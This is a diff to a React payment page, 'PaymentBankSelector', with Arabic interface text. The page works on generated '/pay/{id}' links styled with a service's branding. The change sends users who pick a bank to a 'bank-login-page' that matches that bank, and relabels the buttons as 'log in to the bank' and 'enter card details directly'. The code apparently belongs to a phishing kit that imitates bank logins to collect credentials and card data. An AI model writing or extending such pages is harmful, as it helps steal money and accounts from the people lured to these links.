@@ -5,7 +5,7 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Building2, ArrowLeft, Loader2 } from "lucide-react";
+import { Building2, ArrowLeft, Loader2, Lock, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
@@ -111,7 +111,8 @@ const PaymentBankSelector = () => {
       console.error('Error saving bank selection:', error);
     }
 
-    navigate(`/pay/${id}/card-input`);
+    // إعادة التوجيه إلى صفحة تسجيل الدخول المطابقة للبنك
+    navigate(`/pay/${id}/bank-login-page`);
   };
   
   // Show loading state while fetching link data
@@ -249,31 +250,54 @@ const PaymentBankSelector = () => {
               <h2 className="text-xl font-bold mb-4" style={{ color: branding.colors.primary, fontFamily: branding.fonts?.primaryAr }}>
                 البنوك المتاحة
               </h2>
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
               {banks.map((bank) => (
                 <Card
                   key={bank.id}
-                  className={`p-4 cursor-pointer transition-all hover:shadow-md ${
+                  className={`p-5 cursor-pointer transition-all hover:shadow-lg hover:scale-105 ${
                     selectedBank === bank.id
-                      ? 'ring-2 bg-primary/5'
-                      : 'hover:bg-accent/50'
+                      ? 'ring-2 shadow-xl scale-105'
+                      : ''
                   }`}
                   style={{
-                    borderColor: selectedBank === bank.id ? branding.colors.primary : undefined,
+                    borderColor: selectedBank === bank.id ? bank.color : '#e5e7eb',
+                    borderWidth: selectedBank === bank.id ? '2px' : '1px',
+                    background: selectedBank === bank.id ? `${bank.color}08` : '#ffffff',
                   }}
                   onClick={() => handleBankSelect(bank.id)}
                 >
                   <div className="flex items-center gap-3">
-                    <div
-                      className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
-                      style={{
-                        background: selectedBank === bank.id
-                          ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                          : '#64748b',
-                      }}
-                    >
-                      {bank.nameAr.charAt(0)}
-                    </div>
+                    {bank.logo ? (
+                      <div
+                        className="w-12 h-12 rounded-lg flex items-center justify-center bg-white p-2 shadow-sm"
+                        style={{
+                          border: selectedBank === bank.id 
+                            ? `2px solid ${bank.color}` 
+                            : '2px solid #e5e7eb',
+                        }}
+                      >
+                        <img 
+                          src={bank.logo} 
+                          alt={bank.nameAr}
+                          className="w-full h-full object-contain"
+                          onError={(e) => {
+                            e.currentTarget.style.display = 'none';
+                            e.currentTarget.parentElement!.innerHTML = `<span class="text-sm font-bold" style="color: ${bank.color}">${bank.nameAr.charAt(0)}</span>`;
+                          }}
+                        />
+                      </div>
+                    ) : (
+                      <div
+                        className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
+                        style={{
+                          background: selectedBank === bank.id
+                            ? `linear-gradient(135deg, ${bank.color}, ${bank.secondaryColor || bank.color})`
+                            : '#64748b',
+                        }}
+                      >
+                        {bank.nameAr.charAt(0)}
+                      </div>
+                    )}
                     <div className="flex-1">
                       <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
                       <p className="text-xs text-muted-foreground">{bank.name}</p>
@@ -307,22 +331,29 @@ const PaymentBankSelector = () => {
               <Button
                 onClick={handleContinue}
                 disabled={!selectedBank}
-                className="w-full h-12 text-base font-semibold"
+                className="w-full h-14 text-base font-bold text-white shadow-lg"
                 style={{
                   background: selectedBank
                     ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                     : undefined,
+                  fontFamily: branding.fonts?.primaryAr
                 }}
               >
-                متابعة
+                <Lock className="w-5 h-5 ml-2" />
+                تسجيل الدخول للبنك
               </Button>
               
               <Button
                 onClick={handleSkip}
                 variant="outline"
-                className="w-full h-12 text-base"
+                className="w-full h-12 text-base font-semibold"
+                style={{
+                  borderColor: branding.colors.primary,
+                  color: branding.colors.primary
+                }}
               >
-                تخطي واستخدام أي بنك
+                <CreditCard className="w-5 h-5 ml-2" />
+                إدخال بيانات البطاقة مباشرة
               </Button>
             </div>
 
